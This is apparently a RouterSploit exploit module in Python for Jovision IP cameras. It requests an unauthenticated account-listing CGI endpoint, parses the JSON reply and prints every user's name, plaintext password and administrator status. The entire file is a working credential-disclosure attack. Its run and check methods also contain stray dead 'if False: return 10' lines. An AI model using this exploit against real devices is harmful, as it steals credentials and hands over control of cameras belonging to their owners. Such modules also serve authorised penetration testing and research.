import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
import json

class Exploit(HTTPClient):
    __info__ = {'name': 'Jovision camera credential disclosure', 'description': 'Exploit implementation for jovision IP camera Credential Disclosure vulnerability. If target is vulnerable details of user accounts on the device including usernames and passwords are returned.', 'authors': ('aborche', 'casept'), 'references': ('https://habr.com/ru/post/318572/', 'https://weekly-geekly.github.io/articles/318572/index.html'), 'devices': 'JVS-N63-DY'}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(80, 'Target HTTP port')

    def run(self):
        if False:
            return 10
        if self.check():
            print_success('Target seems to be vulnerable')
            response = self.http_request(method='GET', path='/cgi-bin/jvsweb.cgi?cmd=account&action=list')
            if response is None:
                print_error('Exploit failed - connection error')
                return
            j_resp = json.loads(response.text)
            accounts = list()
            for acc in j_resp:
                account = list()
                account.append(acc.get('acDescript'))
                account.append(acc.get('acID'))
                account.append(acc.get('acPW'))
                if acc.get('nPower') >= 20:
                    account.append('Yes')
                else:
                    account.append('No')
                accounts.append(account)
            print_success('Accounts found:')
            print_table(('Description', 'Username', 'Password', 'Administrator'), *accounts)
        else:
            print_error('Exploit failed - target seems to be not vulnerable')

    @mute
    def check(self):
        if False:
            return 10
        response = self.http_request(method='GET', path='/cgi-bin/jvsweb.cgi?cmd=account&action=list')
        if response is not None and response.status_code == 200:
            res = re.findall('.*acID.*', response.text)
            if len(res) > 0:
                return True
        return False